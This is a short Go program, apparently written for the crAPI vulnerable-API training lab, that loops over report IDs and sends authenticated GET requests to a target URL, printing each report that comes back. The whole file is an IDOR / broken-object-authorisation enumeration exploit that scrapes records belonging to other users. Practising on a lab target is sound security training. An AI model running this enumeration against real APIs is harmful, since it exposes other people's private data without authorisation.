package main

import (
	"fmt"
	"log"
	"net/http"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

func GetAllReportsByID(idCount int, token, target_url string) {
	client := configurator.CustomHttpClient()

	for i := 0; i <= idCount; i++ {
		// fmt.Printf("Checking ID=%d\n", i)
		url := fmt.Sprintf("%s?report_id=%d", target_url, i)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			log.Fatalln(err)
		}

		req = configurator.ConfigureRequest(req, token)

		resp, err := client.Do(req)
		if err != nil {
			log.Fatalln(err)
		}
		defer resp.Body.Close()

		body, _ := configurator.ReadBody(resp)
		if resp.StatusCode != 200 {
			continue
		}
		fmt.Println(string(body))
	}
}
